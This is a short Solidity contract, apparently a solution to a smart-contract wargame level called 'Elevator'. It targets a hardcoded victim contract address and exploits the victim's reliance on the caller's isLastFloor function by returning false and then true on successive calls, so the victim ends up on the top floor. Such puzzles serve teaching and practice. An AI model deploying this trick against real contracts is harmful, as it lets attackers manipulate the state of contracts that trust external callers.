// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;
import "./Elevator.sol";

contract ElevatorAttack{
    bool public switchF = false;

    // Instance our victim contract
    Elevator elevator = Elevator(0x5A86858aA3b595FD6663c2296741eF4cd8BC4d01);

    // call de goto of our victims contract
    function hack() public{
        elevator.goTo(1);
    }
    
    // Implement the function that is not definied in out victimcontract
    function isLastFloor(uint) public returns (bool){
        if(! switchF){
            switchF = true;
            return false;
        }else{
            switchF = false;
            return true;
        }
    }

}
